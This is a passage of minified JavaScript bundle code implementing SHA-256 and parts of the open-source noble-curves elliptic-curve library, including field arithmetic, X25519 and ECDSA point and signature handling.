g=cs[y-15],E=cs[y-2],w=Vr(g,7)^Vr(g,18)^g>>>3,b=Vr(E,17)^Vr(E,19)^E>>>10;cs[y]=b+cs[y-7]+w+cs[y-16]|0}let{A:r,B:i,C:o,D:l,E:c,F:u,G:f,H:d}=this;for(let y=0;y<64;y++){const g=Vr(c,6)^Vr(c,11)^Vr(c,25),E=d+g+wL(c,u,f)+EL[y]+cs[y]|0,w=(Vr(r,2)^Vr(r,13)^Vr(r,22))+vL(r,i,o)|0;d=f,f=u,u=c,c=l+E|0,l=o,o=i,i=r,r=E+w|0}r=r+this.A|0,i=i+this.B|0,o=o+this.C|0,l=l+this.D|0,c=c+this.E|0,u=u+this.F|0,f=f+this.G|0,d=d+this.H|0,this.set(r,i,o,l,c,u,f,d)}roundClean(){cs.fill(0)}destroy(){this.set(0,0,0,0,0,0,0,0),this.buffer.fill(0)}};const qc=k_(()=>new xL);/*! noble-curves - MIT License (c) 2022 Paul Miller (paulmillr.com) */const Df=BigInt(0),Nf=BigInt(1),SL=BigInt(2);function oo(t){return t instanceof Uint8Array||ArrayBuffer.isView(t)&&t.constructor.name==="Uint8Array"}function Hc(t){if(!oo(t))throw new Error("Uint8Array expected")}function Na(t,e){if(typeof e!="boolean")throw new Error(t+" boolean expected, got "+e)}const _L=Array.from({length:256},(t,e)=>e.toString(16).padStart(2,"0"));function ka(t){Hc(t);let e="";for(let n=0;n<t.length;n++)e+=_L[t[n]];return e}function ma(t){const e=t.toString(16);return e.length&1?"0"+e:e}function iw(t){if(typeof t!="string")throw new Error("hex string expected, got "+typeof t);return t===""?Df:BigInt("0x"+t)}const mi={_0:48,_9:57,A:65,F:70,a:97,f:102};function IE(t){if(t>=mi._0&&t<=mi._9)return t-mi._0;if(t>=mi.A&&t<=mi.F)return t-(mi.A-10);if(t>=mi.a&&t<=mi.f)return t-(mi.a-10)}function Ba(t){if(typeof t!="string")throw new Error("hex string expected, got "+typeof t);const e=t.length,n=e/2;if(e%2)throw new Error("hex string expected, got unpadded hex of length "+e);const r=new Uint8Array(n);for(let i=0,o=0;i<n;i++,o+=2){const l=IE(t.charCodeAt(o)),c=IE(t.charCodeAt(o+1));if(l===void 0||c===void 0){const u=t[o]+t[o+1];throw new Error('hex string expected, got non-hex character "'+u+'" at index '+o)}r[i]=l*16+c}return r}function eo(t){return iw(ka(t))}function _c(t){return Hc(t),iw(ka(Uint8Array.from(t).reverse()))}function La(t,e){return Ba(t.toString(16).padStart(e*2,"0"))}function kf(t,e){return La(t,e).reverse()}function IL(t){return Ba(ma(t))}function Jn(t,e,n){let r;if(typeof e=="string")try{r=Ba(e)}catch(o){throw new Error(t+" must be hex string or Uint8Array, cause: "+o)}else if(oo(e))r=Uint8Array.from(e);else throw new Error(t+" must be hex string or Uint8Array");const i=r.length;if(typeof n=="number"&&i!==n)throw new Error(t+" of length "+n+" expected, got "+i);return r}function Ic(...t){let e=0;for(let r=0;r<t.length;r++){const i=t[r];Hc(i),e+=i.length}const n=new Uint8Array(e);for(let r=0,i=0;r<t.length;r++){const o=t[r];n.set(o,i),i+=o.length}return n}function OL(t,e){if(t.length!==e.length)return!1;let n=0;for(let r=0;r<t.length;r++)n|=t[r]^e[r];return n===0}function $L(t){if(typeof t!="string")throw new Error("string expected");return new Uint8Array(new TextEncoder().encode(t))}const Ag=t=>typeof t=="bigint"&&Df<=t;function Bf(t,e,n){return Ag(t)&&Ag(e)&&Ag(n)&&e<=t&&t<n}function Ci(t,e,n,r){if(!Bf(e,n,r))throw new Error("expected valid "+t+": "+n+" <= n < "+r+", got "+e)}function G_(t){let e;for(e=0;t>Df;t>>=Nf,e+=1);return e}function PL(t,e){return t>>BigInt(e)&Nf}function TL(t,e,n){return t|(n?Nf:Df)<<BigInt(e)}const sw=t=>(SL<<BigInt(t-1))-Nf,Cg=t=>new Uint8Array(t),OE=t=>Uint8Array.from(t);function Y_(t,e,n){if(typeof t!="number"||t<2)throw new Error("hashLen must be a number");if(typeof e!="number"||e<2)throw new Error("qByteLen must be a number");if(typeof n!="function")throw new Error("hmacFn must be a function");let r=Cg(t),i=Cg(t),o=0;const l=()=>{r.fill(1),i.fill(0),o=0},c=(...d)=>n(i,r,...d),u=(d=Cg())=>{i=c(OE([0]),d),r=c(),d.length!==0&&(i=c(OE([1]),d),r=c())},f=()=>{if(o++>=1e3)throw new Error("drbg: tried 1000 values");let d=0;const y=[];for(;d<e;){r=c();const g=r.slice();y.push(g),d+=r.length}return Ic(...y)};return(d,y)=>{l(),u(d);let g;for(;!(g=y(f()));)u();return l(),g}}const AL={bigint:t=>typeof t=="bigint",function:t=>typeof t=="function",boolean:t=>typeof t=="boolean",string:t=>typeof t=="string",stringOrUint8Array:t=>typeof t=="string"||oo(t),isSafeInteger:t=>Number.isSafeInteger(t),array:t=>Array.isArray(t),field:(t,e)=>e.Fp.isValid(t),hash:t=>typeof t=="function"&&Number.isSafeInteger(t.outputLen)};function Qa(t,e,n={}){const r=(i,o,l)=>{const c=AL[o];if(typeof c!="function")throw new Error("invalid validator function");const u=t[i];if(!(l&&u===void 0)&&!c(u,t))throw new Error("param "+String(i)+" is invalid. Expected "+o+", got "+u)};for(const[i,o]of Object.entries(e))r(i,o,!1);for(const[i,o]of Object.entries(n))r(i,o,!0);return t}const CL=()=>{throw new Error("not implemented")};function Fy(t){const e=new WeakMap;return(n,...r)=>{const i=e.get(n);if(i!==void 0)return i;const o=t(n,...r);return e.set(n,o),o}}var RL=Object.freeze({__proto__:null,isBytes:oo,abytes:Hc,abool:Na,bytesToHex:ka,numberToHexUnpadded:ma,hexToNumber:iw,hexToBytes:Ba,bytesToNumberBE:eo,bytesToNumberLE:_c,numberToBytesBE:La,numberToBytesLE:kf,numberToVarBytesBE:IL,ensureBytes:Jn,concatBytes:Ic,equalBytes:OL,utf8ToBytes:$L,inRange:Bf,aInRange:Ci,bitLen:G_,bitGet:PL,bitSet:TL,bitMask:sw,createHmacDrbg:Y_,validateObject:Qa,notImplemented:CL,memoized:Fy});const Yt=BigInt(0),Ot=BigInt(1),Ws=BigInt(2),DL=BigInt(3),zy=BigInt(4),$E=BigInt(5),PE=BigInt(8);function Bn(t,e){const n=t%e;return n>=Yt?n:e+n}function J_(t,e,n){if(e<Yt)throw new Error("invalid exponent, negatives unsupported");if(n<=Yt)throw new Error("invalid modulus");if(n===Ot)return Yt;let r=Ot;for(;e>Yt;)e&Ot&&(r=r*t%n),t=t*t%n,e>>=Ot;return r}function Ar(t,e,n){let r=t;for(;e-- >Yt;)r*=r,r%=n;return r}function qy(t,e){if(t===Yt)throw new Error("invert: expected non-zero number");if(e<=Yt)throw new Error("invert: expected positive modulus, got "+e);let n=Bn(t,e),r=e,i=Yt,o=Ot;for(;n!==Yt;){const l=r/n,c=r%n,u=i-o*l;r=n,n=c,i=o,o=u}if(r!==Ot)throw new Error("invert: does not exist");return Bn(i,e)}function NL(t){const e=(t-Ot)/Ws;let n,r,i;for(n=t-Ot,r=0;n%Ws===Yt;n/=Ws,r++);for(i=Ws;i<t&&J_(i,e,t)!==t-Ot;i++)if(i>1e3)throw new Error("Cannot find square root: likely non-prime P");if(r===1){const l=(t+Ot)/zy;return function(c,u){const f=c.pow(u,l);if(!c.eql(c.sqr(f),u))throw new Error("Cannot find square root");return f}}const o=(n+Ot)/Ws;return function(l,c){if(l.pow(c,e)===l.neg(l.ONE))throw new Error("Cannot find square root");let u=r,f=l.pow(l.mul(l.ONE,i),n),d=l.pow(c,o),y=l.pow(c,n);for(;!l.eql(y,l.ONE);){if(l.eql(y,l.ZERO))return l.ZERO;let g=1;for(let w=l.sqr(y);g<u&&!l.eql(w,l.ONE);g++)w=l.sqr(w);const E=l.pow(f,Ot<<BigInt(u-g-1));f=l.sqr(E),d=l.mul(d,E),y=l.mul(y,f),u=g}return d}}function kL(t){if(t%zy===DL){const e=(t+Ot)/zy;return function(n,r){const i=n.pow(r,e);if(!n.eql(n.sqr(i),r))throw new Error("Cannot find square root");return i}}if(t%PE===$E){const e=(t-$E)/PE;return function(n,r){const i=n.mul(r,Ws),o=n.pow(i,e),l=n.mul(r,o),c=n.mul(n.mul(l,Ws),o),u=n.mul(l,n.sub(c,n.ONE));if(!n.eql(n.sqr(u),r))throw new Error("Cannot find square root");return u}}return NL(t)}const BL=["create","isValid","is0","neg","inv","sqrt","sqr","eql","add","sub","mul","pow","div","addN","subN","mulN","sqrN"];function LL(t){const e={ORDER:"bigint",MASK:"bigint",BYTES:"isSafeInteger",BITS:"isSafeInteger"},n=BL.reduce((r,i)=>(r[i]="function",r),e);return Qa(t,n)}function jL(t,e,n){if(n<Yt)throw new Error("invalid exponent, negatives unsupported");if(n===Yt)return t.ONE;if(n===Ot)return e;let r=t.ONE,i=e;for(;n>Yt;)n&Ot&&(r=t.mul(r,i)),i=t.sqr(i),n>>=Ot;return r}function UL(t,e){const n=new Array(e.length),r=e.reduce((o,l,c)=>t.is0(l)?o:(n[c]=o,t.mul(o,l)),t.ONE),i=t.inv(r);return e.reduceRight((o,l,c)=>t.is0(l)?o:(n[c]=t.mul(o,n[c]),t.mul(o,l)),i),n}function Z_(t,e){const n=e!==void 0?e:t.toString(2).length,r=Math.ceil(n/8);return{nBitLength:n,nByteLength:r}}function Q_(t,e,n=!1,r={}){if(t<=Yt)throw new Error("invalid field: expected ORDER > 0, got "+t);const{nBitLength:i,nByteLength:o}=Z_(t,e);if(o>2048)throw new Error("invalid field: expected ORDER of <= 2048 bytes");let l;const c=Object.freeze({ORDER:t,isLE:n,BITS:i,BYTES:o,MASK:sw(i),ZERO:Yt,ONE:Ot,create:u=>Bn(u,t),isValid:u=>{if(typeof u!="bigint")throw new Error("invalid field element: expected bigint, got "+typeof u);return Yt<=u&&u<t},is0:u=>u===Yt,isOdd:u=>(u&Ot)===Ot,neg:u=>Bn(-u,t),eql:(u,f)=>u===f,sqr:u=>Bn(u*u,t),add:(u,f)=>Bn(u+f,t),sub:(u,f)=>Bn(u-f,t),mul:(u,f)=>Bn(u*f,t),pow:(u,f)=>jL(c,u,f),div:(u,f)=>Bn(u*qy(f,t),t),sqrN:u=>u*u,addN:(u,f)=>u+f,subN:(u,f)=>u-f,mulN:(u,f)=>u*f,inv:u=>qy(u,t),sqrt:r.sqrt||(u=>(l||(l=kL(t)),l(c,u))),invertBatch:u=>UL(c,u),cmov:(u,f,d)=>d?f:u,toBytes:u=>n?kf(u,o):La(u,o),fromBytes:u=>{if(u.length!==o)throw new Error("Field.fromBytes: expected "+o+" bytes, got "+u.length);return n?_c(u):eo(u)}});return Object.freeze(c)}function X_(t){if(typeof t!="bigint")throw new Error("field order must be bigint");const e=t.toString(2).length;return Math.ceil(e/8)}function eI(t){const e=X_(t);return e+Math.ceil(e/2)}function ML(t,e,n=!1){const r=t.length,i=X_(e),o=eI(e);if(r<16||r<o||r>1024)throw new Error("expected "+o+"-1024 bytes of input, got "+r);const l=n?_c(t):eo(t),c=Bn(l,e-Ot)+Ot;return n?kf(c,i):La(c,i)}const TE=BigInt(0),Ih=BigInt(1);function Rg(t,e){const n=e.negate();return t?n:e}function tI(t,e){if(!Number.isSafeInteger(t)||t<=0||t>e)throw new Error("invalid window size, expected [1.."+e+"], got W="+t)}function Dg(t,e){tI(t,e);const n=Math.ceil(e/t)+1,r=2**(t-1);return{windows:n,windowSize:r}}function FL(t,e){if(!Array.isArray(t))throw new Error("array expected");t.forEach((n,r)=>{if(!(n instanceof e))throw new Error("invalid point at index "+r)})}function zL(t,e){if(!Array.isArray(t))throw new Error("array of scalars expected");t.forEach((n,r)=>{if(!e.isValid(n))throw new Error("invalid scalar at index "+r)})}const Ng=new WeakMap,nI=new WeakMap;function kg(t){return nI.get(t)||1}function qL(t,e){return{constTimeNegate:Rg,hasPrecomputes(n){return kg(n)!==1},unsafeLadder(n,r,i=t.ZERO){let o=n;for(;r>TE;)r&Ih&&(i=i.add(o)),o=o.double(),r>>=Ih;return i},precomputeWindow(n,r){const{windows:i,windowSize:o}=Dg(r,e),l=[];let c=n,u=c;for(let f=0;f<i;f++){u=c,l.push(u);for(let d=1;d<o;d++)u=u.add(c),l.push(u);c=u.double()}return l},wNAF(n,r,i){const{windows:o,windowSize:l}=Dg(n,e);let c=t.ZERO,u=t.BASE;const f=BigInt(2**n-1),d=2**n,y=BigInt(n);for(let g=0;g<o;g++){const E=g*l;let w=Number(i&f);i>>=y,w>l&&(w-=d,i+=Ih);const b=E,m=E+Math.abs(w)-1,x=g%2!==0,S=w<0;w===0?u=u.add(Rg(x,r[b])):c=c.add(Rg(S,r[m]))}return{p:c,f:u}},wNAFUnsafe(n,r,i,o=t.ZERO){const{windows:l,windowSize:c}=Dg(n,e),u=BigInt(2**n-1),f=2**n,d=BigInt(n);for(let y=0;y<l;y++){const g=y*c;if(i===TE)break;let E=Number(i&u);if(i>>=d,E>c&&(E-=f,i+=Ih),E===0)continue;let w=r[g+Math.abs(E)-1];E<0&&(w=w.negate()),o=o.add(w)}return o},getPrecomputes(n,r,i){let o=Ng.get(r);return o||(o=this.precomputeWindow(r,n),n!==1&&Ng.set(r,i(o))),o},wNAFCached(n,r,i){const o=kg(n);return this.wNAF(o,this.getPrecomputes(o,n,i),r)},wNAFCachedUnsafe(n,r,i,o){const l=kg(n);return l===1?this.unsafeLadder(n,r,o):this.wNAFUnsafe(l,this.getPrecomputes(l,n,i),r,o)},setWindowSize(n,r){tI(r,e),nI.set(n,r),Ng.delete(n)}}}function HL(t,e,n,r){if(FL(n,t),zL(r,e),n.length!==r.length)throw new Error("arrays of points and scalars must have equal length");const i=t.ZERO,o=G_(BigInt(n.length)),l=o>12?o-3:o>4?o-2:o?2:1,c=(1<<l)-1,u=new Array(c+1).fill(i),f=Math.floor((e.BITS-1)/l)*l;let d=i;for(let y=f;y>=0;y-=l){u.fill(i);for(let E=0;E<r.length;E++){const w=r[E],b=Number(w>>BigInt(y)&BigInt(c));u[b]=u[b].add(n[E])}let g=i;for(let E=u.length-1,w=i;E>0;E--)w=w.add(u[E]),g=g.add(w);if(d=d.add(g),y!==0)for(let E=0;E<l;E++)d=d.double()}return d}function rI(t){return LL(t.Fp),Qa(t,{n:"bigint",h:"bigint",Gx:"field",Gy:"field"},{nBitLength:"isSafeInteger",nByteLength:"isSafeInteger"}),Object.freeze({...Z_(t.n,t.nBitLength),...t,p:t.Fp.ORDER})}BigInt(0),BigInt(1),BigInt(2),BigInt(8);const Yo=BigInt(0),Bg=BigInt(1);function VL(t){return Qa(t,{a:"bigint"},{montgomeryBits:"isSafeInteger",nByteLength:"isSafeInteger",adjustScalarBytes:"function",domain:"function",powPminus2:"function",Gu:"bigint"}),Object.freeze({...t})}function WL(t){const e=VL(t),{P:n}=e,r=S=>Bn(S,n),i=e.montgomeryBits,o=Math.ceil(i/8),l=e.nByteLength,c=e.adjustScalarBytes||(S=>S),u=e.powPminus2||(S=>J_(S,n-BigInt(2),n));function f(S,O,$){const R=r(S*(O-$));return O=r(O-R),$=r($+R),[O,$]}const d=(e.a-BigInt(2))/BigInt(4);function y(S,O){Ci("u",S,Yo,n),Ci("scalar",O,Yo,n);const $=O,R=S;let T=Bg,D=Yo,B=S,k=Bg,G=Yo,W;for(let ne=BigInt(i-1);ne>=Yo;ne--){const j=$>>ne&Bg;G^=j,W=f(G,T,B),T=W[0],B=W[1],W=f(G,D,k),D=W[0],k=W[1],G=j;const A=T+D,C=r(A*A),U=T-D,M=r(U*U),N=C-M,V=B+k,F=B-k,q=r(F*A),Q=r(V*U),te=q+Q,se=q-Q;B=r(te*te),k=r(R*r(se*se)),T=r(C*M),D=r(N*(C+r(d*N)))}W=f(G,T,B),T=W[0],B=W[1],W=f(G,D,k),D=W[0],k=W[1];const J=u(D);return r(T*J)}function g(S){return kf(r(S),o)}function E(S){const O=Jn("u coordinate",S,o);return l===32&&(O[31]&=127),_c(O)}function w(S){const O=Jn("scalar",S),$=O.length;if($!==o&&$!==l){let R=""+o+" or "+l;throw new Error("invalid scalar, expected "+R+" bytes, got "+$)}return _c(c(O))}function b(S,O){const $=E(O),R=w(S),T=y($,R);if(T===Yo)throw new Error("invalid private or public key received");return g(T)}const m=g(e.Gu);function x(S){return b(S,m)}return{scalarMult:b,scalarMultBase:x,getSharedSecret:(S,O)=>b(S,O),getPublicKey:S=>x(S),utils:{randomPrivateKey:()=>e.randomBytes(e.nByteLength)},GuBytes:m}}const Hy=BigInt("57896044618658097711785492504343953926634992332820282019728792003956564819949");BigInt(0);const KL=BigInt(1),AE=BigInt(2),GL=BigInt(3),YL=BigInt(5);BigInt(8);function JL(t){const e=BigInt(10),n=BigInt(20),r=BigInt(40),i=BigInt(80),o=Hy,l=t*t%o*t%o,c=Ar(l,AE,o)*l%o,u=Ar(c,KL,o)*t%o,f=Ar(u,YL,o)*u%o,d=Ar(f,e,o)*f%o,y=Ar(d,n,o)*d%o,g=Ar(y,r,o)*y%o,E=Ar(g,i,o)*g%o,w=Ar(E,i,o)*g%o,b=Ar(w,e,o)*f%o;return{pow_p_5_8:Ar(b,AE,o)*t%o,b2:l}}function ZL(t){return t[0]&=248,t[31]&=127,t[31]|=64,t}const Vy=WL({P:Hy,a:BigInt(486662),montgomeryBits:255,nByteLength:32,Gu:BigInt(9),powPminus2:t=>{const e=Hy,{pow_p_5_8:n,b2:r}=JL(t);return Bn(Ar(n,GL,e)*r,e)},adjustScalarBytes:ZL,randomBytes:Za});function CE(t){t.lowS!==void 0&&Na("lowS",t.lowS),t.prehash!==void 0&&Na("prehash",t.prehash)}function QL(t){const e=rI(t);Qa(e,{a:"field",b:"field"},{allowedPrivateKeyLengths:"array",wrapPrivateKey:"boolean",isTorsionFree:"function",clearCofactor:"function",allowInfinityPoint:"boolean",fromBytes:"function",toBytes:"function"});const{endo:n,Fp:r,a:i}=e;if(n){if(!r.eql(i,r.ZERO))throw new Error("invalid endomorphism, can only be defined for Koblitz curves that have a=0");if(typeof n!="object"||typeof n.beta!="bigint"||typeof n.splitScalar!="function")throw new Error("invalid endomorphism, expected beta: bigint and splitScalar: function")}return Object.freeze({...e})}const{bytesToNumberBE:XL,hexToBytes:ej}=RL;let tj=class extends Error{constructor(e=""){super(e)}};const _i={Err:tj,_tlv:{encode:(t,e)=>{const{Err:n}=_i;if(t<0||t>256)throw new n("tlv.encode: wrong tag");if(e.length&1)throw new n("tlv.encode: unpadded data");const r=e.length/2,i=ma(r);if(i.length/2&128)throw new n("tlv.encode: long form length too big");const o=r>127?ma(i.length/2|128):"";return ma(t)+o+i+e},decode(t,e){const{Err:n}=_i;let r=0;if(t<0||t>256)throw new n("tlv.encode: wrong tag");if(e.length<2||e[r++]!==t)throw new n("tlv.decode: wrong tlv");const i=e[r++],o=!!(i&128);let l=0;if(!o)l=i;else{const u=i&127;if(!u)throw new n("tlv.decode(long): indefinite length not supported");if(u>4)throw new n("tlv.decode(long): byte length is too big");const f=e.subarray(r,r+u);if(f.length!==u)throw new n("tlv.decode: length bytes not complete");if(f[0]===0)throw new n("tlv.decode(long): zero leftmost byte");for(const d of f)l=l<<8|d;if(r+=u,l<128)throw new n("tlv.decode(long): not minimal encoding")}const c=e.subarray(r,r+l);if(c.length!==l)throw new n("tlv.decode: wrong value length");return{v:c,l:e.subarray(r+l)}}},_int:{encode(t){const{Err:e}=_i;if(t<$i)throw new e("integer: negative integers are not allowed");let n=ma(t);if(Number.parseInt(n[0],16)&8&&(n="00"+n),n.length&1)throw new e("unexpected DER parsing assertion: unpadded hex");return n},decode(t){const{Err:e}=_i;if(t[0]&128)throw new e("invalid signature integer: negative");if(t[0]===0&&!(t[1]&128))throw new e("invalid signature integer: unnecessary leading zero");return XL(t)}},toSig(t){const{Err:e,_int:n,_tlv:r}=_i,i=typeof t=="string"?ej(t):t;Hc(i);const{v:o,l}=r.decode(48,i);if(l.length)throw new e("invalid signature: left bytes after parsing");const{v:c,l:u}=r.decode(2,o),{v:f,l:d}=r.decode(2,u);if(d.length)throw new e("invalid signature: left bytes after parsing");return{r:n.decode(c),s:n.decode(f)}},hexFromSig(t){const{_tlv:e,_int:n}=_i,r=e.encode(2,n.encode(t.r)),i=e.encode(2,n.encode(t.s)),o=r+i;return e.encode(48,o)}},$i=BigInt(0),Ht=BigInt(1);BigInt(2);const RE=BigInt(3);BigInt(4);function nj(t){const e=QL(t),{Fp:n}=e,r=Q_(e.n,e.nBitLength),i=e.toBytes||((b,m,x)=>{const S=m.toAffine();return Ic(Uint8Array.from([4]),n.toBytes(S.x),n.toBytes(S.y))}),o=e.fromBytes||(b=>{const m=b.subarray(1),x=n.fromBytes(m.subarray(0,n.BYTES)),S=n.fromBytes(m.subarray(n.BYTES,2*n.BYTES));return{x,y:S}});function l(b){const{a:m,b:x}=e,S=n.sqr(b),O=n.mul(S,b);return n.add(n.add(O,n.mul(b,m)),x)}if(!n.eql(n.sqr(e.Gy),l(e.Gx)))throw new Error("bad generator point: equation left != right");function c(b){return Bf(b,Ht,e.n)}function u(b){const{allowedPrivateKeyLengths:m,nByteLength:x,wrapPrivateKey:S,n:O}=e;if(m&&typeof b!="bigint"){if(oo(b)&&(b=ka(b)),typeof b!="string"||!m.includes(b.length))throw new Error("invalid private key");b=b.padStart(x*2,"0")}let $;try{$=typeof b=="bigint"?b:eo(Jn("private key",b,x))}catch{throw new Error("invalid private key, expected hex or "+x+" bytes, got "+typeof b)}return S&&($=Bn($,O)),Ci("private key",$,Ht,O),$}function f(b){if(!(b instanceof g))throw new Error("ProjectivePoint expected")}const d=Fy((b,m)=>{const{px:x,py:S,pz:O}=b;if(n.eql(O,n.ONE))return{x,y:S};const $=b.is0();m==null&&(m=$?n.ONE:n.inv(O));const R=n.mul(x,m),T=n.mul(S,m),D=n.mul(O,m);if($)return{x:n.ZERO,y:n.ZERO};if(!n.eql(D,n.ONE))throw new Error("invZ was invalid");return{x:R,y:T}}),y=Fy(b=>{if(b.is0()){if(e.allowInfinityPoint&&!n.is0(b.py))return;throw new Error("bad point: ZERO")}const{x:m,y:x}=b.toAffine();if(!n.isValid(m)||!n.isValid(x))throw new Error("bad point: x or y not FE");const S=n.sqr(x),O=l(m);if(!n.eql(S,O))throw new Error("bad point: equation left != right");if(!b.isTorsionFree())throw new Error("bad point: not in prime-order subgroup");return!0});class g{constructor(m,x,S){if(this.px=m,this.py=x,this.pz=S,m==null||!n.isValid(m))throw new Error("x required");if(x==null||!n.isValid(x))throw new Error("y required");if(S==null||!n.isValid(S))throw new Error("z required");Object.freeze(this)}static fromAffine(m){const{x,y:S}=m||{};if(!m||!n.isValid(x)||!n.isValid(S))throw new Error("invalid affine point");if(m instanceof g)throw new Error("projective point not allowed");const O=$=>n.eql($,n.ZERO);return O(x)&&O(S)?g.ZERO:new g(x,S,n.ONE)}get x(){return this.toAffine().x}get y(){return this.toAffine().y}static normalizeZ(m){const x=n.invertBatch(m.map(S=>S.pz));return m.map((S,O)=>S.toAffine(x[O])).map(g.fromAffine)}static fromHex(m){const x=g.fromAffine(o(Jn("pointHex",m)));return x.assertValidity(),x}static fromPrivateKey(m){return g.BASE.multiply(u(m))}static msm(m,x){return HL(g,r,m,x)}_setWindowSize(m){w.setWindowSize(this,m)}assertValidity(){y(this)}hasEvenY(){const{y:m}=this.toAffine();if(n.isOdd)return!n.isOdd(m);throw new Error("Field doesn't support isOdd")}equals(m){f(m);const{px:x,py:S,pz:O}=this,{px:$,py:R,pz:T}=m,D=n.eql(n.mul(x,T),n.mul($,O)),B=n.eql(n.mul(S,T),n.mul(R,O));return D&&B}negate(){return new g(this.px,n.neg(this.py),this.pz)}double(){const{a:m,b:x}=e,S=n.mul(x,RE),{px:O,py:$,pz:R}=this;let T=n.ZERO,D=n.ZERO,B=n.ZERO,k=n.mul(O,O),G=n.mul($,$),W=n.mul(R,R),J=n.mul(O,$);return J=n.add(J,J),B=n.mul(O,R),B=n.add(B,B),T=n.mul(m,B),D=n.mul(S,W),D=n.add(T,D),T=n.sub(G,D),D=n.add(G,D),D=n.mul(T,D),T=n.mul(J,T),B=n.mul(S,B),W=n.mul(m,W),J=n.sub(k,W),J=n.mul(m,J),J=n.add(J,B),B=n.add(k,k),k=n.add(B,k),k=n.add(k,W),k=n.mul(k,J),D=n.add(D,k),W=n.mul($,R),W=n.add(W,W),k=n.mul(W,J),T=n.sub(T,k),B=n.mul(W,G),B=n.add(B,B),B=n.add(B,B),new g(T,D,B)}add(m){f(m);const{px:x,py:S,pz:O}=this,{px:$,py:R,pz:T}=m;let D=n.ZERO,B=n.ZERO,k=n.ZERO;const G=e.a,W=n.mul(e.b,RE);let J=n.mul(x,$),ne=n.mul(S,R),j=n.mul(O,T),A=n.add(x,S),C=n.add($,R);A=n.mul(A,C),C=n.add(J,ne),A=n.sub(A,C),C=n.add(x,O);let U=n.add($,T);return C=n.mul(C,U),U=n.add(J,j),C=n.sub(C,U),U=n.add(S,O),D=n.add(R,T),U=n.mul(U,D),D=n.add(ne,j),U=n.sub(U,D),k=n.mul(G,C),D=n.mul(W,j),k=n.add(D,k),D=n.sub(ne,k),k=n.add(ne,k),B=n.mul(D,k),ne=n.add(J,J),ne=n.add(ne,J),j=n.mul(G,j),C=n.mul(W,C),ne=n.add(ne,j),j=n.sub(J,j),j=n.mul(G,j),C=n.add(C,j),J=n.mul(ne,C),B=n.add(B,J),J=n.mul(U,C),D=n.mul(A,D),D=n.sub(D,J),J=n.mul(A,ne),k=n.mul(U,k),k=n.add(k,J),new g(D,B,k)}subtract(m){return this.add(m.negate())}is0(){return this.equals(g.ZERO)}wNAF(m){return w.wNAFCached(this,m,g.normalizeZ)}multiplyUnsafe(m){const{endo:x,n:S}=e;Ci("scalar",m,$i,S);const O=g.ZERO;if(m===$i)return O;if(this.is0()||m===Ht)return this;if(!x||w.hasPrecomputes(this))return w.wNAFCachedUnsafe(this,m,g.normalizeZ);let{k1neg:$,k1:R,k2neg:T,k2:D}=x.splitScalar(m),B=O,k=O,G=this;for(;R>$i||D>$i;)R&Ht&&(B=B.add(G)),D&Ht&&(k=k.add(G)),G=G.double(),R>>=Ht,D>>=Ht;return $&&(B=B.negate()),T&&(k=k.negate()),k=new g(n.mul(k.px,x.beta),k.py,k.pz),B.add(k)}multiply(m){const{endo:x,n:S}=e;Ci("scalar",m,Ht,S);let O,$;if(x){const{k1neg:R,k1:T,k2neg:D,k2:B}=x.splitScalar(m);let{p:k,f:G}=this.wNAF(T),{p:W,f:J}=this.wNAF(B);k=w.constTimeNegate(R,k),W=w.constTimeNegate(D,W),W=new g(n.mul(W.px,x.beta),W.py,W.pz),O=k.add(W),$=G.add(J)}else{const{p:R,f:T}=this.wNAF(m);O=R,$=T}return g.normalizeZ([O,$])[0]}multiplyAndAddUnsafe(m,x,S){const O=g.BASE,$=(T,D)=>D===$i||D===Ht||!T.equals(O)?T.multiplyUnsafe(D):T.multiply(D),R=$(this,x).add($(m,S));return R.is0()?void 0:R}toAffine(m){return d(this,m)}isTorsionFree(){const{h:m,isTorsionFree:x}=e;if(m===Ht)return!0;if(x)return x(g,this);throw new Error("isTorsionFree() has not been declared for the elliptic curve")}clearCofactor(){const{h:m,clearCofactor:x}=e;return m===Ht?this:x?x(g,this):this.multiplyUnsafe(e.h)}toRawBytes(m=!0){return Na("isCompressed",m),this.assertValidity(),i(g,this,m)}toHex(m=!0){return Na("isCompressed",m),ka(this.toRawBytes(m))}}g.BASE=new g(e.Gx,e.Gy,n.ONE),g.ZERO=new g(n.ZERO,n.ONE,n.ZERO);const E=e.nBitLength,w=qL(g,e.endo?Math.ceil(E/2):E);return{CURVE:e,ProjectivePoint:g,normPrivateKeyToScalar:u,weierstrassEquation:l,isWithinCurveOrder:c}}function rj(t){const e=rI(t);return Qa(e,{hash:"hash",hmac:"function",randomBytes:"function"},{bits2int:"function",bits2int_modN:"function",lowS:"boolean"}),Object.freeze({lowS:!0,...e})}function ij(t){const e=rj(t),{Fp:n,n:r}=e,i=n.BYTES+1,o=2*n.BYTES+1;function l(j){return Bn(j,r)}function c(j){return qy(j,r)}const{ProjectivePoint:u,normPrivateKeyToScalar:f,weierstrassEquation:d,isWithinCurveOrder:y}=nj({...e,toBytes(j,A,C){const U=A.toAffine(),M=n.toBytes(U.x),N=Ic;return Na("isCompressed",C),C?N(Uint8Array.from([A.hasEvenY()?2:3]),M):N(Uint8Array.from([4]),M,n.toBytes(U.y))},fromBytes(j){const A=j.length,C=j[0],U=j.subarray(1);if(A===i&&(C===2||C===3)){const M=eo(U);if(!Bf(M,Ht,n.ORDER))throw new Error("Point is not on curve");const N=d(M);let V;try{V=n.sqrt(N)}catch(q){const Q=q instanceof Error?": "+q.message:"";throw new Error("Point is not on curve"+Q)}const F=(V&Ht)===Ht;return(C&1)===1!==F&&(V=n.neg(V)),{x:M,y:V}}else if(A===o&&C===4){const M=n.fromBytes(U.subarray(0,n.BYTES)),N=n.fromBytes(U.subarray(n.BYTES,2*n.BYTES));return{x:M,y:N}}else{const M=i,N=o;throw new Error("invalid Point, expected length of "+M+", or uncompressed "+N+", got "+A)}}}),g=j=>ka(La(j,e.nByteLength));function E(j){const A=r>>Ht;return j>A}function w(j){return E(j)?l(-j):j}const b=(j,A,C)=>eo(j.slice(A,C));class m{constructor(A,C,U){this.r=A,this.s=C,this.recovery=U,this.assertValidity()}static fromCompact(A){const C=e.nByteLength;return A=Jn("compactSignature",A,C*2),new m(b(A,0,C),b(A,C,2*C))}static fromDER(A){const{r:C,s:U}=_i.toSig(Jn("DER",A));return new m(C,U)}assertValidity(){Ci("r",this.r,Ht,r),Ci("s",this.s,Ht,r)}addRecoveryBit(A){return new m(this.r,this.s,A)}recoverPublicKey(A){const{r:C,s:U,recovery:M}=this,N=T(Jn("msgHash",A));if(M==null||![0,1,2,3].includes(M))throw new Error("recovery id invalid");const 